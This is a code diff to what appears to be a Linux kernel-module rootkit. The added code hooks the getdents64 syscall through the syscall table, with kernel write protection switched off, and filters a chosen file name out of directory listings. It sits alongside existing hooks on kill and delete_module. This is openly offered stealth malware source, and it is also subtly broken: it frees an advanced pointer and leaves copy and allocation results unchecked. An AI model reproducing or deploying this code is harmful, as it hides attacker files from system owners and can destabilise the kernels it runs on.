@@ -4,6 +4,7 @@ kallsyms_lookup_name_t my_kallsyms_lookup_name=NULL;
 unsigned long __lkm_order;
 t_syscall my_pre_sys_kill=NULL;
 t_syscall my_pre_sys_delete_mod=NULL;
+t_syscall my_pre_sys_getdents64=NULL;
 struct kprobe kp={
   .symbol_name="kallsyms_lookup_name",
 };
@@ -86,6 +87,37 @@ asmlinkage long hook_tar_delete_mod(const struct pt_regs *pt){
   }
   return (*my_pre_sys_delete_mod)(pt);
 }
+int cnt=0;
+char name[10005]="file.c";
+inline static bool hide_file(char *file_name){
+  return strcmp(name,file_name)==0;
+}
+asmlinkage long hook_tar_getdents64(const struct pt_regs *pt){
+  int ret=(*my_pre_sys_getdents64)(pt);
+  unsigned int fd=pt->di;
+  struct linux_dirent64 __user *dirent=pt->si;
+  unsigned int count=pt->dx;
+  struct linux_dirent64 *buffer=kmalloc(count+5,GFP_KERNEL);
+  struct linux_dirent64 *target=kmalloc(count+5,GFP_KERNEL);
+  unsigned int used=0;
+  copy_from_user(buffer,dirent,ret);
+  int bret=ret;
+  while(ret>0&&buffer->d_reclen>0){
+    if(hide_file(buffer->d_name)){
+
+    }else{
+      memcpy(((void *)(target))+used,(void *)buffer,buffer->d_reclen);
+      used+=buffer->d_reclen;
+    }
+    ret-=buffer->d_reclen;
+    buffer=((void *)(buffer))+buffer->d_reclen;
+  }
+  copy_to_user(dirent,target,used);
+  kfree(buffer);
+  kfree(target);
+  return used;
+}
+
 void my_hook_syscall(void){
   register_kprobe(&kp);
   my_kallsyms_lookup_name=(kallsyms_lookup_name_t)kp.addr;
@@ -97,10 +129,12 @@ void my_hook_syscall(void){
   }
   my_pre_sys_kill=(void *)(__sys_call_table[__NR_kill]);
   my_pre_sys_delete_mod=(void *)(__sys_call_table[__NR_delete_module]);
+  my_pre_sys_getdents64=(void *)(__sys_call_table[__NR_getdents64]);
   printk(KERN_INFO "Hook yes! %p",my_pre_sys_kill);
   write_cr0_my(0);
   __sys_call_table[__NR_kill]=(unsigned long)(hook_tar_kill);
   __sys_call_table[__NR_delete_module]=(unsigned long)(hook_tar_delete_mod);
+  __sys_call_table[__NR_getdents64]=(unsigned long)(hook_tar_getdents64);
   write_cr0_my(1);
   return ;
 }
@@ -109,6 +143,7 @@ void my_unregister_hook_syscall(void){
   write_cr0_my(0);
   __sys_call_table[__NR_kill]=(unsigned long )my_pre_sys_kill;
   __sys_call_table[__NR_delete_module]=(unsigned long )my_pre_sys_delete_mod;
+  __sys_call_table[__NR_getdents64]=(unsigned long )my_pre_sys_getdents64;
   write_cr0_my(1);
   return ;
 }
